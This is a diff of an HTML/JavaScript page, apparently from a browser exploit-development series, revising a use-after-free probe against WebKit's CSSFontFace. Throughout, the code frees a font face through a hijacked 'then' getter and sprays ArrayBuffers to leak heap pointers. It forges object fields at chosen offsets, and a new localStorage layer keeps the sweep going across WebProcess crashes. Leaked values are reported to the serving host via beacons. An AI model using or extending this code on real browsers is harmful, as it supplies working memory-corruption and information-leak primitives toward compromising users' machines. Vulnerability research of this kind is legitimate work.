@@ -1,233 +1,231 @@
 <!--
-  p576: CSSFontFace UAF diagnostic forge sweep.
+  p576: CSSFontFace UAF diagnostic forge sweep (crash-resilient v2).
 
-  p571 only forged +0x58 (leaving +0x68 = 0, i.e. m_keyCount = 0) so iterateClients
-  never iterated and every test survived. Issue #155 says full forge -> SEGV 15/15,
-  refcount-only -> survive 15/15. The crash comes from SUBSEQUENT engine code that
-  accesses the reclaimed CSSFontFace after the then getter returns.
+  One test per page load. Uses localStorage to auto-advance through tests.
+  If WebProcess crashes mid-test, the reload detects the incomplete test,
+  marks it CRASHED, and advances to the next one.
 
-  This probe identifies which CSSFontFace offsets cause the crash by testing
-  them progressively: safe first, dangerous last. The first crash ends the series;
-  beacons tell us which test was active.
+  Each load: fresh leak UAF (ASLR changes per WebProcess), then one forge test.
+  Results accumulate in localStorage across crashes/reloads.
 
-  Pre-churn: warm the 192B bmalloc bucket (V12+ technique).
-  Stage 1: Standard UAF leak (p563-style) to get +0x58/+0x68.
-  Stage 2: Sequential forge tests, each with its own FontFace.
-
-  Tests (safe → dangerous):
-    T0  BASELINE     +0x00=2, rest=0
-    T1  P58_ORIG     +0x00=2, +0x58=leaked (original m_table), rest=0
-    T2  P58_ORIG_KC1 +0x00=2, +0x58=leaked, +0x60=4, +0x64=3, +0x68=1 (force iteration)
-    T3  P58_BAD_KC1  +0x00=2, +0x58=0x41.., +0x60=4, +0x64=3, +0x68=1 (bad table + iteration)
-    T4  OFF_08       +0x00=2, +0x08=0x41.. only
-    T5  OFF_10       +0x00=2, +0x10=0x41.. only
-    T6  OFF_18       +0x00=2, +0x18=0x41.. only
-    T7  FULL         +0x00=2, ALL other offsets = 0x41..
+  Open p576...html#reset to clear state and start over.
 
   CRASH_CLASS: HIGH
 -->
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>p576 diagnostic forge sweep</title>
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p576 forge sweep</title>
 <script>
 function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function writeQ(v,off,bytes){for(var i=0;i<8;i++)v[off+i]=bytes[i];}
+function writeD(v,off,val){v[off]=val&0xFF;v[off+1]=(val>>8)&0xFF;v[off+2]=(val>>16)&0xFF;v[off+3]=(val>>24)&0xFF;}
 function hex8(v,o){var s='';for(var i=0;i<8;i++){var c=v[o+i];s+=(c<16?'0':'')+c.toString(16);}return s;}
 function grab(v,o){var a=[];for(var i=0;i<8;i++)a.push(v[o+i]);return a;}
 
-function writeQ(v,off,bytes){for(var i=0;i<8;i++)v[off+i]=bytes[i];}
-function writeD(v,off,val){v[off]=val&0xFF;v[off+1]=(val>>8)&0xFF;v[off+2]=(val>>16)&0xFF;v[off+3]=(val>>24)&0xFF;}
 var BAD=[0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41];
-
 var K=8, SIZE=192;
-var leaked={p58:null,p68:null};
-var testIdx=0, testsDone=0;
-var allRetained=[];
+var retained=[];
 
 var TESTS=[
-  {name:'BASELINE', fn:function(v){writeD(v,0,2);}},
-  {name:'P58_ORIG', fn:function(v,p58){writeD(v,0,2);if(p58)writeQ(v,0x58,p58);}},
-  {name:'P58_ORIG_KC1', fn:function(v,p58){
+  {name:'BASELINE',fn:function(v){writeD(v,0,2);}},
+  {name:'OFF_08',fn:function(v){writeD(v,0,2);writeQ(v,0x08,BAD);}},
+  {name:'OFF_10',fn:function(v){writeD(v,0,2);writeQ(v,0x10,BAD);}},
+  {name:'OFF_18',fn:function(v){writeD(v,0,2);writeQ(v,0x18,BAD);}},
+  {name:'OFF_20',fn:function(v){writeD(v,0,2);writeQ(v,0x20,BAD);}},
+  {name:'OFF_28',fn:function(v){writeD(v,0,2);writeQ(v,0x28,BAD);}},
+  {name:'OFF_30',fn:function(v){writeD(v,0,2);writeQ(v,0x30,BAD);}},
+  {name:'OFF_38',fn:function(v){writeD(v,0,2);writeQ(v,0x38,BAD);}},
+  {name:'OFF_40',fn:function(v){writeD(v,0,2);writeQ(v,0x40,BAD);}},
+  {name:'OFF_48',fn:function(v){writeD(v,0,2);writeQ(v,0x48,BAD);}},
+  {name:'OFF_50',fn:function(v){writeD(v,0,2);writeQ(v,0x50,BAD);}},
+  {name:'OFF_58',fn:function(v){writeD(v,0,2);writeQ(v,0x58,BAD);}},
+  {name:'OFF_60',fn:function(v){writeD(v,0,2);writeQ(v,0x60,BAD);}},
+  {name:'OFF_68',fn:function(v){writeD(v,0,2);writeQ(v,0x68,BAD);}},
+  {name:'OFF_70',fn:function(v){writeD(v,0,2);writeQ(v,0x70,BAD);}},
+  {name:'OFF_78',fn:function(v){writeD(v,0,2);writeQ(v,0x78,BAD);}},
+  {name:'KC1',fn:function(v,p58){
     writeD(v,0,2);if(p58)writeQ(v,0x58,p58);
     writeD(v,0x60,4);writeD(v,0x64,3);writeD(v,0x68,1);writeD(v,0x6C,0);
-  }},
-  {name:'P58_BAD_KC1', fn:function(v,p58){
-    writeD(v,0,2);writeQ(v,0x58,BAD);
-    writeD(v,0x60,4);writeD(v,0x64,3);writeD(v,0x68,1);writeD(v,0x6C,0);
-  }},
-  {name:'OFF_08', fn:function(v){writeD(v,0,2);writeQ(v,0x08,BAD);}},
-  {name:'OFF_10', fn:function(v){writeD(v,0,2);writeQ(v,0x10,BAD);}},
-  {name:'OFF_18', fn:function(v){writeD(v,0,2);writeQ(v,0x18,BAD);}},
-  {name:'FULL', fn:function(v,p58){
-    writeD(v,0,2);
-    for(var off=0x08;off<SIZE;off+=8)writeQ(v,off,BAD);
   }}
 ];
 
-/* ============================================================
-   PRE-CHURN: warm the 192B bmalloc bucket
-   ============================================================ */
-function preChurn(cb){
-  b('P576-PRECHURN');
-  var ds=document.createElement('style');
-  ds.textContent="@font-face{font-family:pcdummy;src:local(Arial);unicode-range:U+0043;}";
-  document.head.appendChild(ds);
-  var df=new FontFace('pcdf','local(Arial)',{unicodeRange:'U+0043'});
-  document.fonts.add(df);
-  void df.loaded;
-  allRetained.push(df);
-  setTimeout(function(){
-    ds.remove();ds.textContent='';
-    try{document.fonts.delete(df);}catch(e){}
-    document.body.offsetHeight;
-    b('P576-PRECHURN-DONE');
-    setTimeout(cb,50);
-  },100);
-}
+/* ---- localStorage state ---- */
+function gs(){try{var s=localStorage.getItem('p576');return s?JSON.parse(s):null;}catch(e){return null;}}
+function ss(s){try{localStorage.setItem('p576',JSON.stringify(s));}catch(e){}}
 
-/* ============================================================
-   STAGE 1: Leak (+0x58/+0x68)
-   ============================================================ */
+/* ---- Leak phase (fresh per WebProcess) — matches p563 exactly ---- */
 function leakPhase(cb){
   b('P576-LEAK-START');
 
-  var styleEl=document.createElement('style');
-  styleEl.textContent="@font-face{font-family:slk;src:local(Arial);unicode-range:U+0042;}";
-  document.head.appendChild(styleEl);
+  var A;
+  try{A=new FontFace('flk','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('P576-ERR-NEWFACE-'+e.message);cb(null);return;}
+  b('P576-LEAK-FACE-OK');
+  try{document.fonts.add(A);}catch(e){}
+  b('P576-LEAK-ADDED');
+  try{void A.loaded;}catch(e){}
+  b('P576-LEAK-LOADED');
+  retained.push(A);
 
-  var A=new FontFace('flk','local(Helvetica)',{unicodeRange:'U+0041'});
-  document.fonts.add(A);void A.loaded;
-  allRetained.push(A);
+  var se=document.createElement('style');
+  se.textContent="@font-face{font-family:slk;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(se);
+  b('P576-LEAK-STYLE');
 
   var fired=false;
   Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
     if(fired)return undefined;fired=true;
-    styleEl.remove();styleEl.textContent='';
+    b('P576-GETTER-FIRED');
+    if(se)se.remove();
     try{document.fonts.delete(this);}catch(e){}
     document.body.offsetHeight;
+    b('P576-GETTER-FREED');
 
-    window.__lkMap=[];
-    var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
-    for(var si=0;si<SIZES.length;si++){
+    window.__lk=[];
+    var SZ=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+    for(var si=0;si<SZ.length;si++){
       for(var k=0;k<K;k++){
-        var ab=new ArrayBuffer(SIZES[si]);
-        window.__lkMap.push({size:SIZES[si],view:new Uint8Array(ab)});
+        var ab=new ArrayBuffer(SZ[si]);
+        window.__lk.push({s:SZ[si],v:new Uint8Array(ab)});
       }
     }
+    b('P576-GETTER-SPRAYED');
     try{document.fonts.check('1em slk');}catch(e){}
     return undefined;
   },set:function(){}});
+  b('P576-LEAK-GETTER-SET');
 
   document.fonts.load('1em flk, slk','AB').then(function(){b('P576-LEAK-RESOLVED');},function(){b('P576-LEAK-REJECTED');});
+  b('P576-LEAK-LOAD-CALLED');
 
-  var scanned=false;
+  var done=false;
   function scan(){
-    if(scanned)return;
-    var m=window.__lkMap;if(!m||!m.length)return;
+    if(done)return;
+    var m=window.__lk;if(!m)return;
     for(var i=0;i<m.length;i++){
-      if(m[i].size!==192)continue;
-      var v=m[i].view,nz=0;
+      if(m[i].s!==192)continue;
+      var v=m[i].v,nz=0;
       for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
       if(nz>0){
-        scanned=true;
-        leaked.p58=grab(v,0x58);leaked.p68=grab(v,0x68);
+        done=true;
         var rc=v[0]|(v[1]<<8)|(v[2]<<16)|(v[3]<<24);
-        b('P576-LEAK-HIT-b'+i+'-nz'+nz+'-rc='+rc+'-p58='+hex8(v,0x58)+'-p68='+hex8(v,0x68));
-        setTimeout(cb,100);
-        return;
-      }
-    }
-    for(var i=0;i<m.length;i++){
-      var v=m[i].view,nz=0;
-      for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
-      if(nz>0){
-        scanned=true;
-        b('P576-LEAK-WRONGSIZE-b'+i+'-s'+m[i].size+'-nz'+nz);
-        setTimeout(cb,100);
+        b('P576-LEAK-HIT-rc='+rc+'-p58='+hex8(v,0x58)+'-p68='+hex8(v,0x68));
+        cb({p58:grab(v,0x58),p68:grab(v,0x68)});
         return;
       }
     }
   }
   setTimeout(scan,80);
   setTimeout(scan,400);
-  setTimeout(function(){if(!scanned){b('P576-LEAK-TIMEOUT');cb();}},2000);
+  setTimeout(function(){if(!done){b('P576-LEAK-FAIL');cb(null);}},2000);
 }
 
-/* ============================================================
-   STAGE 2: Sequential forge tests
-   ============================================================ */
-function runTest(idx){
-  if(idx>=TESTS.length){b('P576-ALL-DONE-'+testsDone+'/'+TESTS.length);return;}
-  testIdx=idx;
+/* ---- Test phase ---- */
+function runTest(idx,leaked){
   var t=TESTS[idx];
-  b('P576-T'+idx+'-'+t.name+'-START');
+  b('P576-RUN-T'+idx+'-'+t.name);
 
-  var famA='fa'+idx, famS='fs'+idx;
+  var fam='ft'+idx,fs='fs'+idx;
   var se=document.createElement('style');
-  se.textContent="@font-face{font-family:"+famS+";src:local(Arial);unicode-range:U+0042;}";
+  se.textContent="@font-face{font-family:"+fs+";src:local(Arial);unicode-range:U+0042;}";
   document.head.appendChild(se);
 
-  var face=new FontFace(famA,'local(Helvetica)',{unicodeRange:'U+0041'});
-  document.fonts.add(face);void face.loaded;
-  allRetained.push(face);
+  var face=new FontFace(fam,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);void face.loaded;retained.push(face);
 
   var fired=false;
   Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
     if(fired)return undefined;fired=true;
-
-    se.remove();se.textContent='';
+    if(se)se.remove();
     try{document.fonts.delete(this);}catch(e){}
     document.body.offsetHeight;
 
-    window['__tMap'+idx]=[];
+    window.__tb=[];
     for(var k=0;k<K;k++){
       var ab=new ArrayBuffer(SIZE);
       var v=new Uint8Array(ab);
-      t.fn(v,leaked.p58,leaked.p68);
-      window['__tMap'+idx].push({view:v});
+      t.fn(v,leaked?leaked.p58:null,leaked?leaked.p68:null);
+      window.__tb.push(v);
     }
-    try{document.fonts.check('1em '+famS);}catch(e){}
+    try{document.fonts.check('1em '+fs);}catch(e){}
     return undefined;
   },set:function(){}});
 
-  b('P576-T'+idx+'-'+t.name+'-LOAD');
-  document.fonts.load('1em '+famA+', '+famS,'AB').then(
+  document.fonts.load('1em '+fam+', '+fs,'AB').then(
     function(){b('P576-T'+idx+'-'+t.name+'-RESOLVED');},
     function(){b('P576-T'+idx+'-'+t.name+'-REJECTED');}
   );
 
   setTimeout(function(){
     b('P576-T'+idx+'-'+t.name+'-SURVIVED');
-    testsDone++;
-
-    var m=window['__tMap'+idx];
-    if(m&&m.length>0){
-      var best=-1,nz=0;
-      for(var i=0;i<m.length;i++){var v=m[i].view,n=0;for(var j=0;j<v.length;j++)if(v[j]!==0)n++;if(n>nz){nz=n;best=i;}}
-      if(best>=0){
-        var v=m[best].view;
-        var rc=v[0]|(v[1]<<8)|(v[2]<<16)|(v[3]<<24);
-        b('P576-T'+idx+'-'+t.name+'-SCAN-b'+best+'-nz'+nz+'-rc='+rc+'-p58='+hex8(v,0x58)+'-p68='+hex8(v,0x68));
-      }else{
-        b('P576-T'+idx+'-'+t.name+'-SCAN-CLEAN');
-      }
+    var state=gs();
+    if(state){
+      state.r[idx]='OK';
+      state.i=idx+1;
+      state.run=-1;
+      ss(state);
     }
-
-    setTimeout(function(){runTest(idx+1);},300);
+    setTimeout(function(){location.reload();},300);
   },800);
 }
 
-/* ============================================================
-   MAIN
-   ============================================================ */
+/* ---- Main ---- */
 function main(){
-  b('P576-BOOT-tests='+TESTS.length);
-  preChurn(function(){
-    leakPhase(function(){
-      if(!leaked.p58){b('P576-NOLEAK-ABORT');return;}
-      b('P576-STAGE2-BEGIN');
-      runTest(0);
-    });
+  if(location.hash==='#reset'){
+    try{localStorage.removeItem('p576');}catch(e){}
+    b('P576-RESET');
+    document.body.innerHTML='<p>State cleared. Remove #reset from URL and reload.</p>';
+    return;
+  }
+
+  var state=gs();
+
+  /* First boot: init */
+  if(!state){
+    state={i:0,r:[],run:-1,boots:0};
+    for(var j=0;j<TESTS.length;j++)state.r.push(null);
+  }
+  state.boots=(state.boots||0)+1;
+
+  /* Detect crash from previous run */
+  if(state.run>=0){
+    var ci=state.run;
+    b('P576-CRASH-T'+ci+'-'+TESTS[ci].name);
+    state.r[ci]='CRASH';
+    state.i=ci+1;
+    state.run=-1;
+  }
+
+  ss(state);
+  var idx=state.i;
+
+  /* All done */
+  if(idx>=TESTS.length){
+    var parts=[];
+    for(var j=0;j<TESTS.length;j++)parts.push(TESTS[j].name+'='+state.r[j]);
+    b('P576-DONE-'+parts.join(','));
+    document.body.innerHTML='<p>Done (boot '+state.boots+'). See beacons.</p>';
+    return;
+  }
+
+  b('P576-BOOT-'+state.boots+'-next=T'+idx+'-'+TESTS[idx].name);
+
+  /* Mark test as running (crash detection) */
+  state.run=idx;
+  ss(state);
+
+  /* Leak then test */
+  leakPhase(function(leaked){
+    if(!leaked){
+      b('P576-NOLEAK-SKIP-T'+idx);
+      state.r[idx]='NOLEAK';
+      state.i=idx+1;
+      state.run=-1;
+      ss(state);
+      setTimeout(function(){location.reload();},500);
+      return;
+    }
+    runTest(idx,leaked);
   });
 }
 
 if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(main,0);
 else document.addEventListener('DOMContentLoaded',main);
-</script></head><body><p>p576 diagnostic forge sweep</p></body></html>
+</script></head><body><p>p576 forge sweep — crash-resilient</p></body></html>
